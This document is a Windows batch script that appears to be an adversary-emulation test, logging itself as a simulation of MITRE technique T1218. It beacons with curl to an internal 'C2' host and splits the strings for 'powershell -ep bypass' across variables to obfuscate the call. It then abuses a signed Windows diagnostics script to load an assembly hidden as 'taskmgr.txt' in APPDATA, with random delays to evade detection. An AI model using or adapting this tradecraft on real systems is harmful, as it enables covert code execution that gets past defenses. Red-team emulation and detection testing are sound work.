@echo off
SETLOCAL EnableDelayedExpansion

REM PHR_ constants (plain literals - NEVER obfuscated)
SET zxmqp=https://10.0.0.49
SET akjdh=taskmgr.txt
SET uiytr=%APPDATA%\8220\19f43bd6
SET plmnb=https://10.0.0.49/stage/2/icon.png?8220-7
SET qwzxc=ITZEL-S2BO
SET mnbvc=7
SET vcxza=8220

REM Log file setup using PHR_ variables
SET lkjhg=%APPDATA%\!mnbvc!\macula-simulations.log
SET iuytr=T1218
SET oiuyt=Signed Binary Proxy Execution

REM Initial random delay (30-60 seconds)
echo [!DATE! !TIME!][DEBUG][!qwzxc!]: initial_delay_start=30s>> "!lkjhg!" 2>nul
timeout /t 30 /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!qwzxc!]: initial_delay_complete>> "!lkjhg!" 2>nul

REM C2 HEARTBEAT (first operation)
echo [!DATE! !TIME!][DEBUG][!qwzxc!]: heartbeat_start=!plmnb!>> "!lkjhg!" 2>nul
SET cmda=curl
SET cmdb= -k
SET cmdc= -s
SET cmdd= -o
SET cmde= nul
SET cmdf= "!plmnb!"
SET cmdfull=!cmda!!cmdb!!cmdc!!cmdd!!cmde!!cmdf!
!cmdfull!
echo [!DATE! !TIME!][DEBUG][!qwzxc!]: heartbeat_complete>> "!lkjhg!" 2>nul

REM Delay between operations
echo [!DATE! !TIME!][DEBUG][!qwzxc!]: delay_start=10s>> "!lkjhg!" 2>nul
ping -n 10 127.0.0.1 >nul
echo [!DATE! !TIME!][DEBUG][!qwzxc!]: delay_complete>> "!lkjhg!" 2>nul

REM Create temp directory if needed
echo [!DATE! !TIME!][DEBUG][!qwzxc!]: directory_check=!uiytr!>> "!lkjhg!" 2>nul
IF NOT EXIST "!uiytr!" (
    mkdir "!uiytr!" >nul 2>&1
    echo [!DATE! !TIME!][DEBUG][!qwzxc!]: directory_created=!uiytr!>> "!lkjhg!" 2>nul
)

REM Random delay
SET /A rdelay=%RANDOM% %% 20 + 10
echo [!DATE! !TIME!][DEBUG][!qwzxc!]: random_delay_start=!rdelay!>> "!lkjhg!" 2>nul
timeout /t !rdelay! /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!qwzxc!]: random_delay_complete>> "!lkjhg!" 2>nul

REM Obfuscate PowerShell command parts
SET ps1=pow
SET ps2=ershe
SET ps3=ll
SET ps4=.ex
SET ps5=e
SET pscmd=!ps1!!ps2!!ps3!!ps4!!ps5!

SET arg1= -ep
SET arg2= by
SET arg3=pass
SET arg4= -c
SET arg5=ommand
SET argfull=!arg1!!arg2!!arg3!!arg4!!arg5!

REM Build command string with variable indirection
SET cmdpart1=set-location -path C:\Windows\diagnostics\system\Audio; import-module .\CL_
SET cmdpart2=Load
SET cmdpart3=Assembly.ps1; LoadAssemblyFromPath 
SET cmdpart4=!uiytr!\\!akjdh!;[Program]::Dale()
SET fullcmd=!cmdpart1!!cmdpart2!!cmdpart3!!cmdpart4!

REM Multi-level variable indirection for execution
SET exec1=!pscmd!
SET exec2=!argfull!
SET exec3="!fullcmd!"
SET execvar1=exec1
SET execvar2=exec2
SET execvar3=exec3

CALL SET finalexec1=%%!execvar1!%%
CALL SET finalexec2=%%!execvar2!%%
CALL SET finalexec3=%%!execvar3!%%

REM Execute with TTP logging
echo [!DATE! !TIME!][DEBUG][!qwzxc!]: ttp_execution_start=T1218>> "!lkjhg!" 2>nul
SET ttp_result=0
SET ttp_error=

!finalexec1!!finalexec2!!finalexec3! >nul 2>&1
IF !ERRORLEVEL! EQU 0 (
    SET ttp_result=1
    SET ttp_error=
) ELSE (
    SET ttp_error=assembly_load_failed
)

REM Format timestamp for TTP log
FOR /F "tokens=1-3 delims=/ " %%a IN ("!DATE!") DO SET ttp_date=%%c-%%a-%%b
SET ttp_time=!TIME!
IF "!ttp_time:~1,1!"==":" SET ttp_time=0!ttp_time!
SET ttp_fullstamp=!ttp_date! !ttp_time!.000

REM Write TTP log entry
(
    echo [!ttp_fullstamp!][!qwzxc!]: !mnbvc!-!vcxza!-!iuytr!^|!oiuyt!=!ttp_result!:!ttp_error!
) >> "!lkjhg!" 2>nul

echo [!DATE! !TIME!][DEBUG][!qwzxc!]: ttp_execution_complete=result:!ttp_result!>> "!lkjhg!" 2>nul

REM Final delay before exit
echo [!DATE! !TIME!][DEBUG][!qwzxc!]: final_delay_start=15s>> "!lkjhg!" 2>nul
CHOICE /C Y /N /D Y /T 15 >nul
echo [!DATE! !TIME!][DEBUG][!qwzxc!]: final_delay_complete>> "!lkjhg!" 2>nul

ENDLOCAL